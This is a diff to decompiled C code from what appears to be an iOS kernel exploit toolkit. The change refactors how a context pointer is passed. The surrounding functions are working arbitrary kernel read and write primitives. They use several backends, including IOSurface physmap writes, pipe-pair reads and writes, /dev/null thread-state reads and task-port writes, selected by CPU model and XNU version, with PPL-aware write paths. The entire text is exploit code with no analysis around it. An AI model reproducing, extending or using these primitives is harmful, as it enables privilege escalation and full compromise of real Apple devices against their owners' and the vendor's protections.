@@ -28488,7 +28488,7 @@ LABEL_29:
           {
             if ( krw_ctx_has_flag(a1, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK) )
             {
-              v26 = port_table_lookup_v1((int *)a1, v6[4], 1, 1, 96);
+              v26 = port_table_lookup_v1((int *)KRWCTX_RAW_PTR(a1), v6[4], 1, 1, 96);
 LABEL_47:
               v3 = v26;
               if ( (uint32_t)v26 )
@@ -28563,6 +28563,7 @@ __int64 __fastcall teardown_sptm_pgtable_state(__int64 a1)
 //----- (0000000000028DFC) ----------------------------------------------------
 bool __fastcall noppl_kwrite32(__int64 a1, mach_vm_address_t address, int a3)
 {
+  struct_krwCtx *ctx; // x19
   __int64 (__fastcall *v5)(__int64, mach_vm_address_t, int *, __int64, __int64); // x8
   int v6; // w0
   kern_return_t v7; // w21
@@ -28570,6 +28571,7 @@ bool __fastcall noppl_kwrite32(__int64 a1, mach_vm_address_t address, int a3)
   int v10; // [xsp+8h] [xbp-28h] BYREF
   vm_machine_attribute_val_t value; // [xsp+Ch] [xbp-24h] BYREF
 
+  ctx = KRWCTX_FROM_UINTPTR(a1);
   v10 = a3;
   v5 = *(__int64 (__fastcall **)(__int64, mach_vm_address_t, int *, __int64, __int64))(a1 + 64);
   if ( v5 )
@@ -28579,7 +28581,7 @@ bool __fastcall noppl_kwrite32(__int64 a1, mach_vm_address_t address, int a3)
   }
   if ( (unsigned int)(*(uint32_t *)(a1 + 172) + 1) >= 2 && *(uint64_t *)(a1 + 216) )
   {
-    v6 = iosurface_physmap_kwrite((struct_krwCtx *)a1, address, (__int64)&v10, 4u, 1);
+    v6 = iosurface_physmap_kwrite(ctx, address, (__int64)&v10, 4u, 1);
   }
   else if ( (unsigned int)(*(uint32_t *)(a1 + 232) + 1) >= 2 && *(uint64_t *)(a1 + 248) && *(uint64_t *)(a1 + 256) )
   {
@@ -28603,7 +28605,7 @@ LABEL_22:
       mach_vm_machine_attribute(v9, address, 4u, 1u, &value);
       return v7 == 0;
     }
-    v6 = pipe_pair_krw((struct_krwCtx *)a1, address, &v10, 4u, 1);
+    v6 = pipe_pair_krw(ctx, address, &v10, 4u, 1);
   }
 LABEL_3:
   if ( v6 )
@@ -29047,11 +29049,13 @@ LABEL_100:
 //----- (00000000000295B4) ----------------------------------------------------
 bool __fastcall kread_u32(__int64 krwCtx, unsigned __int64 vaddr, void *outBuf)
 {
+  struct_krwCtx *ctx; // x19
   __int64 (__fastcall *v3)(__int64, unsigned __int64, void *, unsigned int, __int64); // x8
   int v4; // w0
   int v5; // w0
   __int64 v7; // [xsp+8h] [xbp-8h] BYREF
 
+  ctx = KRWCTX_FROM_UINTPTR(krwCtx);
   v3 = *(__int64 (__fastcall **)(__int64, unsigned __int64, void *, unsigned int, __int64))(krwCtx + 48);
   if ( v3 )
   {
@@ -29060,7 +29064,7 @@ bool __fastcall kread_u32(__int64 krwCtx, unsigned __int64 vaddr, void *outBuf)
   }
   if ( (unsigned int)(*(uint32_t *)(krwCtx + 172) + 1) >= 2 && *(uint64_t *)(krwCtx + 216) )
   {
-    v4 = kreadbuf_via_dev_null_and_thread_state((struct_krwCtx *)krwCtx, vaddr, (__int64)outBuf, 4u, 1);
+    v4 = kreadbuf_via_dev_null_and_thread_state(ctx, vaddr, (__int64)outBuf, 4u, 1);
   }
   else if ( (unsigned int)(*(uint32_t *)(krwCtx + 232) + 1) >= 2 && *(uint64_t *)(krwCtx + 248) && *(uint64_t *)(krwCtx + 256) )
   {
@@ -29072,7 +29076,7 @@ bool __fastcall kread_u32(__int64 krwCtx, unsigned __int64 vaddr, void *outBuf)
       goto LABEL_22;
     if ( *(uint32_t *)(krwCtx + 6464) != -1 && *(uint64_t *)(krwCtx + 536) )
     {
-      v4 = kreadbuf_via_dev_null_only(krwCtx, vaddr, (__int64)outBuf, 4u, 1);
+      v4 = kreadbuf_via_dev_null_only(ctx, vaddr, (__int64)outBuf, 4u, 1);
       goto LABEL_3;
     }
     if ( *(uint32_t *)(krwCtx + 6456) == -1 || *(uint32_t *)(krwCtx + 6460) == -1 )
@@ -29087,7 +29091,7 @@ LABEL_22:
              &v7);
       return v5 == 0;
     }
-    v4 = kreadbuf_via_dev_null_simple((struct_krwCtx *)krwCtx, vaddr, outBuf, 4u, 1);
+    v4 = kreadbuf_via_dev_null_simple(ctx, vaddr, outBuf, 4u, 1);
   }
 LABEL_3:
   if ( v4 )
@@ -29406,7 +29410,7 @@ bool __fastcall kread64_internal(struct_krwCtx *a1, unsigned __int64 a2, uint64_
       goto LABEL_22;
     if ( a1->gap1915 != -1 && a1->gap190u )
     {
-      v4 = kreadbuf_via_dev_null_only((__int64)a1, a2, (__int64)a3, a1->stride168, 1);
+      v4 = kreadbuf_via_dev_null_only(a1, a2, (__int64)a3, a1->stride168, 1);
       goto LABEL_3;
     }
     if ( a1->gap1913 == -1 || a1->gap1914 == -1 )
@@ -29466,6 +29470,7 @@ unsigned __int64 __fastcall sub_29D88(struct_krwCtx *a1, __int64 a2)
 //----- (0000000000029DF8) ----------------------------------------------------
 bool __fastcall this_is_the_kwrite64(__int64 a1, mach_vm_address_t address, __int64 newValue, int whatIsThis)
 {
+  struct_krwCtx *ctx; // x19
   __int64 (__fastcall *v6)(__int64, mach_vm_address_t, __int64 *, uint64_t, __int64); // x8
   int v7; // w0
   kern_return_t v8; // w21
@@ -29484,6 +29489,7 @@ bool __fastcall this_is_the_kwrite64(__int64 a1, mach_vm_address_t address, __in
   __int64 v23; // [xsp+10h] [xbp-40h] BYREF
   vm_machine_attribute_val_t value[2]; // [xsp+18h] [xbp-38h] BYREF
 
+  ctx = KRWCTX_FROM_UINTPTR(a1);
   v22 = newValue;
   v6 = *(__int64 (__fastcall **)(__int64, mach_vm_address_t, __int64 *, uint64_t, __int64))(a1 + 64);
   if ( v6 )
@@ -29499,7 +29505,7 @@ bool __fastcall this_is_the_kwrite64(__int64 a1, mach_vm_address_t address, __in
       v8 = 5;
       return v8 == 0;
     }
-    v7 = iosurface_physmap_kwrite((struct_krwCtx *)a1, address, (__int64)value, *(uint32_t *)(a1 + 360), 1);
+    v7 = iosurface_physmap_kwrite(ctx, address, (__int64)value, *(uint32_t *)(a1 + 360), 1);
     goto LABEL_3;
   }
   if ( (unsigned int)(*(uint32_t *)(a1 + 232) + 1) >= 2 && *(uint64_t *)(a1 + 248) && *(uint64_t *)(a1 + 256) )
@@ -29513,7 +29519,7 @@ bool __fastcall this_is_the_kwrite64(__int64 a1, mach_vm_address_t address, __in
   {
     if ( *(uint32_t *)(a1 + 6456) != -1 && *(uint32_t *)(a1 + 6460) != -1 )
     {
-      v7 = pipe_pair_krw((struct_krwCtx *)a1, address, &v22, *(uint32_t *)(a1 + 360), 1);
+      v7 = pipe_pair_krw(ctx, address, &v22, *(uint32_t *)(a1 + 360), 1);
       goto LABEL_3;
     }
 LABEL_27:
@@ -29669,7 +29675,7 @@ unsigned __int64 __fastcall port_right_index_to_kaddr(__int64 a1, unsigned int a
     }
     return 0;
   }
-  result = kernel_va_base_resolver((struct_krwCtx *)a1, 0, &v6);
+  result = kernel_va_base_resolver(KRWCTX_FROM_UINTPTR(a1), 0, &v6);
   if ( result )
     result += v2 << v6;
   return result;
@@ -29794,7 +29800,7 @@ bool __fastcall kreadbuf_universal(struct_krwCtx *krwCtx, unsigned __int64 vaddr
       goto LABEL_22;
     if ( krwCtx->gap1915 != -1 && krwCtx->gap190u )
     {
-      v6 = kreadbuf_via_dev_null_only((__int64)krwCtx, vaddr, (__int64)outBuf, size, a5);
+      v6 = kreadbuf_via_dev_null_only(krwCtx, vaddr, (__int64)outBuf, size, a5);
       goto LABEL_3;
     }
     if ( krwCtx->gap1913 == -1 || krwCtx->gap1914 == -1 )
@@ -29816,16 +29822,18 @@ LABEL_3:
 //----- (000000000002A480) ----------------------------------------------------
 bool __fastcall kreadbuf_0(__int64 ctx, unsigned __int64 addr, mach_vm_size_t size, void *outBuf)
 {
-  return kreadbuf_universal((struct_krwCtx *)ctx, addr, size, outBuf, 0);
+  return kreadbuf_universal(KRWCTX_FROM_UINTPTR(ctx), addr, size, outBuf, 0);
 }
 
 //----- (000000000002A488) ----------------------------------------------------
 bool __fastcall noppl_kwritebuf(__int64 a1, unsigned __int64 a2, const void *a3, mach_vm_size_t a4, int a5)
 {
+  struct_krwCtx *ctx; // x19
   __int64 (__fastcall *v5)(__int64, unsigned __int64, const void *, mach_vm_size_t, int); // x8
   int v6; // w0
   int v7; // w0
 
+  ctx = KRWCTX_FROM_UINTPTR(a1);
   TRACE_PORTS("noppl_kwritebuf enter ctx=%llx addr=%llx buf=%llx size=%llx a5=%d fn=%llx sptm_fd=%d sptm_ctx=%llx shm_port=%d shm_u=%llx shm_k=%llx necp_r=%d necp_w=%d pipe0=%d pipe1=%d iosurface_fd=%d necp=%llx tfp=%d chunk=%u\n",
               (unsigned long long)a1,
               (unsigned long long)a2,
@@ -29855,7 +29863,7 @@ bool __fastcall noppl_kwritebuf(__int64 a1, unsigned __int64 a2, const void *a3,
   }
   if ( (unsigned int)(*(uint32_t *)(a1 + 172) + 1) >= 2 && *(uint64_t *)(a1 + 216) )
   {
-    v6 = iosurface_physmap_kwrite((struct_krwCtx *)a1, a2, (__int64)a3, a4, a5);
+    v6 = iosurface_physmap_kwrite(ctx, a2, (__int64)a3, a4, a5);
     TRACE_PORTS("noppl_kwritebuf backend=sptm raw=%x\n", v6);
   }
   else if ( (unsigned int)(*(uint32_t *)(a1 + 232) + 1) >= 2 && *(uint64_t *)(a1 + 248) && *(uint64_t *)(a1 + 256) )
@@ -29880,7 +29888,7 @@ LABEL_22:
       TRACE_PORTS("noppl_kwritebuf backend=tfp raw=%x ok=%d\n", v7, v7 == 0);
       return v7 == 0;
     }
-    v6 = pipe_pair_krw((struct_krwCtx *)a1, a2, a3, a4, a5);
+    v6 = pipe_pair_krw(ctx, a2, a3, a4, a5);
     TRACE_PORTS("noppl_kwritebuf backend=pipe raw=%x\n", v6);
   }
 LABEL_3:
@@ -29915,7 +29923,7 @@ LABEL_8:
     return noppl_kwrite32((__int64)a1, a2, a3);
   }
   if ( krw_ctx_has_flag(a1, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
-    return ppl_kwritebuf((__int64)v5, v4, &newBytes, 4);
+    return ppl_kwritebuf(v5, v4, &newBytes, 4);
   result = remap_kaddr_through_physmap(v5, v4);
   if ( result )
   {
@@ -29952,7 +29960,7 @@ int kwrite64_dispatch(struct_krwCtx *ctx, mach_vm_address_t address, __int64 new
 
     // Old path (and new path fallthrough):
     // ldrb w3, [x20, #0xc]  →  4th arg = ctx->byte_0x0c
-    uint8_t arg3 = *(uint8_t *)((uint8_t *)ctx + 0x0c);
+    uint8_t arg3 = *(uint8_t *)(KRWCTX_RAW_PTR(ctx) + 0x0c);
 
     // Tail call
     return kwrite64_last_arg(ctx, address, new_value, arg3);
@@ -29971,18 +29979,18 @@ unsigned __int64 __fastcall kwritebuf_universal(
   unsigned __int64 result; // x0
 
   vaddr_ = vaddr;
-  ctx_ = (struct_krwCtx *)a1;
+  ctx_ = KRWCTX_FROM_UINTPTR(a1);
   if ( a1[43] >= XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
   {
-    if ( krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
+    if ( krw_ctx_has_flag(ctx_, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
     {
-      return ppl_kwritebuf((__int64)ctx_, vaddr_, (void *)newBytes, length);
+      return ppl_kwritebuf(ctx_, vaddr_, (void *)newBytes, length);
     }
     result = remap_kaddr_through_physmap(ctx_, vaddr_);
     if ( !result )
       return result;
     vaddr = result;
-    a1 = &ctx_->flags;
+    a1 = (uint64_t *)KRWCTX_RAW_PTR(ctx_);
   }
   return noppl_kwritebuf((__int64)a1, vaddr, newBytes, length, 1);
 }
